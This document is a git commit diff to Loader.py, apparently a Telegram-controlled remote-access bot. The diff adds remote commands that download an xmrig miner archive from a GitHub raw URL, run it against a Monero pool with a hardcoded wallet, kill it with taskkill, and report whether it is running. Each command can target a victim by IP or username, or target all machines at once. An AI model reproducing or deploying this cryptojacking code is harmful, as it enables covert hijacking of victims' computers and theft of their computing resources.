038ed3dfbc11c5d708e2e171a556754a782696e7
MohamadXo213 <46904638+MohamadXo213@users.noreply.github.com>
2021-07-19 15:49:34 -0700

    Update Loader.py

--- Loader.py
+++ Loader.py
@@ -151,6 +151,40 @@ class Loader():
 							self.SendMessage("%E2%9C%94%EF%B8%8F Program Name Changed")
 						else:
 							self.SendMessage("%E2%9C%96%EF%B8%8F Need Administrator Privileges")
+					elif command == "/download_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
+						self.SendMessage("%E2%9C%94%EF%B8%8F Downloading Miner...")
+						req = requests.get('https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig-6.13.1.rar')
+						file = tempfile.TemporaryFile()
+						filename = file.name + ".rar"
+						file = open(filename,"wb")
+						file.write(req.content)
+						file.close()
+						self.SendMessage("%E2%9C%94%EF%B8%8F Miner Downloaded")
+					elif command == "/start_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
+						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
+							sub = subprocess.Popen(["cmd.exe","/c","%temp%\\xmrig.exe","-o","pool.supportxmr.com:443","-u","458ZEGNtG6G52CUbSmfbU4f47PiZqGaTDjRzFwRazR1JCxFdZvWdv6wQeG6PGmsskiHCw3yQ5XoptPQZwFkGxwpMMngnN2V","-k","--tls","-p",getpass.getuser()],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Started")
+						else:
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Installed")
+					elif command == "/stop_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
+						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
+							os.system('taskkill /IM xmrig.exe /F')
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Stoped")
+						else:
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Installed")
+					elif command == "/miner_status" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
+						found = False
+						for proc in psutil.process_iter():
+							try:
+								if proc.name() == "xmrig.exe":
+									found = True
+									break
+							except:
+								pass
+						if found == True:
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Working")
+						else:
+							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Not Working")
 				else:
 					file_id = message['document']['file_id']
 					caption = message['caption']
